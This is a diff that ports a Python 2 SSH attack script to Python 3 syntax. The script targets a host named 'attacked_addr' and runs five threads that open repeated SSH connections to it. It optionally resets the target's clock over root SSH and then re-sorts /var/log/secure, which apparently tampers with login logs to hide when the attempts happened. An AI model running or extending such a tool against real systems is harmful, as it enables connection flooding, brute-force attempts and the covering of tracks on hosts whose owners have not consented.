@@ -1,5 +1,8 @@
 #!/usr/bin/python
-import paramiko, sys, os, socket
+import paramiko
+import sys
+import os
+import socket
 import threading
 import subprocess
 
@@ -7,6 +10,7 @@ attacked_addr = sys.argv[1]
 username = sys.argv[2]
 number = sys.argv[3]
 time = sys.argv[4]
+
 
 class myThread (threading.Thread):
     def __init__(self, threadID, name):
@@ -16,23 +20,24 @@ class myThread (threading.Thread):
         self.assign_number = 0
 
     def run(self):
-        print "Starting " + self.name
+        print("Starting " + self.name)
         if(self.threadID != 5):
-            self.assign_number = int(number)/5
+            self.assign_number = int(number) / 5
         else:
-            self.assign_number = int(number) - (int(number)/5)*4
-        
+            self.assign_number = int(number) - (int(number) / 5) * 4
+
         for i in range(0, self.assign_number):
             try:
                 response = ssh_connect()
                 if response == 1:
-                    print "{}: {}".format(self.name, i)
+                    print("{}: {}".format(self.name, i))
                 elif response == 2:
-                    print "socket error"
-            except Exception, e:
-                print e
+                    print("socket error")
+            except Exception as e:
+                print(e)
                 pass
-        print "Exiting " + self.name
+        print("Exiting " + self.name)
+
 
 def ssh_connect():
     ssh = paramiko.SSHClient()
@@ -47,6 +52,7 @@ def ssh_connect():
 
     ssh.close()
     return response
+
 
 # Set system date as the same as input
 if time != "none":
@@ -77,6 +83,9 @@ thread5.join()
 if time != "none":
     correct_date = subprocess.check_output("date +%Y%m%d", shell=True)
     correct_time = subprocess.check_output("date +%T", shell=True)
-    os.system("ssh root@{0} date +%Y%m%d -s {1}".format(attacked_addr, correct_date))
-    os.system("ssh root@{0} date +%T -s {1}".format(attacked_addr, correct_time))
-    os.system("ssh root@{0} sort --stable --reverse --key=1,2 /var/log/secure -o /var/log/secure".format(attacked_addr))
+    os.system(
+        "ssh root@{0} date +%Y%m%d -s {1}".format(attacked_addr, correct_date))
+    os.system(
+        "ssh root@{0} date +%T -s {1}".format(attacked_addr, correct_time))
+    os.system(
+        "ssh root@{0} sort --stable --reverse --key=1,2 /var/log/secure -o /var/log/secure".format(attacked_addr))
